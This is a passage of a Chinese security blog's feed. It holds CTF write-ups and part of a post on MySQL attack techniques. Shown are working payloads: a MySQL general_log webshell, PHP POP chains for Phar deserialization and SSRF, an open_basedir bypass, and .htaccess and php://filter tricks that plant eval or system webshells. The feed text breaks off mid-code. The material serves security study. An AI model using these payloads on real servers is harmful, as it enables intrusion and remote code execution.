class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;;</span><br></pre></td></tr></table></figure><p>日志文件导出到指定目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file&#x3D;&quot;&#x2F;tmp&#x2F;shell.php&quot;;</span><br></pre></td></tr></table></figure><p>记录SQL语句写shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&quot;;</span><br></pre></td></tr></table></figure><p>关闭记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;off&#39;;</span><br></pre></td></tr></table></figure><h3 id="UDF提权">UDF提权</h3><p>大马提权：<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/大马/udf.php</a></p><p>手工提权：<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p><p><a href="https://cooltige.com/2020/06/02/Mysql-Udf%E6%8F%90%E6%9D%83/">https://cooltige.com/2020/06/02/Mysql-Udf提权/</a></p><p><a href="https://xz.aliyun.com/t/2199">https://xz.aliyun.com/t/2199</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL攻击面和提权总结&quot;&gt;MySQL攻击面和提权总结&lt;/h1&gt;
&lt;p&gt;本次实验使用腾讯云主机的MySQL Server作为服务端，阿里云主机作为MySQL客户端。&lt;/p&gt;
&lt;p&gt;其中均使用宝塔面板搭建MySQL8.0版本。&lt;/p&gt;
&lt;p&gt;首先要开放腾讯云主机的
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="MySQL" scheme="http://ca0y1h.top/tags/MySQL/"/>
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2019-PharMatchesEverything</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything/</id>
    <published>2020-12-10T14:54:33.000Z</published>
    <updated>2020-12-10T14:56:20.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-Phar-matches-everything">NCTF2019 Phar matches everything</h1><p>去年NCTF2019的题目，可以说是考到了PHP大部分的知识点，值得一做。</p><p>原题目提示是通过vim的备份文件下载源码，但是BUU上的环境好像没有备份文件，只能从GitHub上下载<code>catchmime.php</code>和<code>upload.php</code>两个文件的源代码，</p><p>首先是upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target_dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">$imageFileType=substr($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],strrpos($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],<span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>,strlen($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line"></span><br><span class="line">$file_name = md5(time());</span><br><span class="line">$file_name =substr($file_name, <span class="number">0</span>, <span class="number">10</span>).<span class="string">&quot;.&quot;</span>.$imageFileType;</span><br><span class="line"></span><br><span class="line">$target_file=$target_dir.$file_name;</span><br><span class="line"></span><br><span class="line">    $check = getimagesize($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . $check[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        $uploadOk = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">        $uploadOk = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($imageFileType !== <span class="string">&quot;jpg&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;png&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;gif&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;jpeg&quot;</span>  ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file <span class="subst">$file_name</span>  has been uploaded to ./uploads/&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>单独看这个upload.php使用了白名单限制，只能上传图片后缀的文件，应该要结合其他的功能点一起利用。</p><p>再看catchmime.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">&#x27;careful&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . $check[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个文件中存在两个和功能不相干的类<code>Main</code>和<code>Easytest</code>。</p><p><code>getimagesize</code>会触发Phar反序列化，然后在<code>careful</code>参数触发<code>Easy_test</code>类的反序列化，修改test参数为1。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url = <span class="string">&#x27;file:///etc/passwd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Main();</span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="comment">### POP链构造</span></span><br><span class="line">@unlink(<span class="string">&quot;phar1.phar&quot;</span>);<span class="comment">//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($b);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>然后payload打过去</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119191059.png" alt=""></p><p>读了一圈文件，没找到flag，又不能执行命令，尝试去读<code>/etc/hosts</code>（或者<code>/etc/net/arp</code>)</p><p>读到了一个内网IP地址<code>10.247.100.9</code>。结果BUU上面我试了好几个C段地址之后，<code>10.247.100.11</code>这个地址终于返回了PHP-FPM。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119211543.png" alt=""></p><p>接着就用SSRF打FPM，网上都是用P牛的脚本去构造，</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119211947.png" alt=""></p><p>有open_basedir限制，绕过一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119215144.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;NCTF2019-Phar-matches-everything&quot;&gt;NCTF2019 Phar matches everything&lt;/h1&gt;
&lt;p&gt;去年NCTF2019的题目，可以说是考到了PHP大部分的知识点，值得一做。&lt;/p&gt;
&lt;p&gt;原题目提示是通过vim的
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2020-Web-Writeups</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups/</id>
    <published>2020-12-10T14:53:59.000Z</published>
    <updated>2020-12-10T14:55:48.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2020-Web-Writeup">羊城杯2020 Web Writeup</h1><p>当时没时间打，现在题目在GitHub上开源了，随便看看。</p><h2 id="easycon">easycon</h2><p>蚁剑连接一句话，下载bbbbbbbbb.txt文件，是一个少了头部分的base64编码的图片，加上头再转码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201208163136.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201208163156.png" alt=""></p><h2 id="easyser">easyser</h2><p>这题目说实在的，提示地太隐晦了，用不安全的协议读取ser.php文件，Fuzz半天发现是用<code>http://127.0.0.1/star1.php</code>读取源码。</p><p>ser.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line">$flag=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;&#x27;</span>,$text=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $file;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = $text;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $d   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">        @file_put_contents(<span class="keyword">$this</span>-&gt; file,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*$c=$_GET[&#x27;c&#x27;];</span></span><br><span class="line"><span class="comment">echo $x=unserialize($c);*/</span></span><br></pre></td></tr></table></figure><p>POP链构造+绕过exit</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;php://filter/convert.base64-decode/resource=aaa.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $text = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1Rbc10pOyAgPz4=&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> GWHT;</span><br><span class="line">$a-&gt;hero = <span class="keyword">new</span> Yongen;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h2 id="easyphp">easyphp</h2><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一反应就是覆盖掉index.php，但是好像没有写入权限，那大概率应该就是用<code>.htaccess</code>这个文件做文章了。</p><p>第一种思路，向<code>.htaccess</code>文件写入shell，并且用auto_prepend_file包含<code>.htaccess</code>，但是<code>file</code>关键字被ban了，可以用换行绕过，结尾要用<code>\</code>处理content中的<code>\n</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;? php%20system(&#39;cat%20&#x2F;fl[a]g&#39;);?&gt;\</span><br></pre></td></tr></table></figure><p>第二种思路，依然是利用<code>.htaccess</code>文件特性，不过这次是通过设置php_value来设置<code>preg_macth</code>正则回溯次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure><p>先写入<code>.htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename&#x3D;.htaccess</span><br></pre></td></tr></table></figure><p>再直接通过<code>php://filter</code>伪协议写入一句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess&amp;content&#x3D;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs&#x2F;Plw&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><h2 id="easyphp2">easyphp2</h2><p>robots.txt提示有check.php</p><p>伪协议读取源码：</p><blockquote><p><a href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;GWHT.php</span><br></pre></td></tr></table></figure><p>GWHT.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 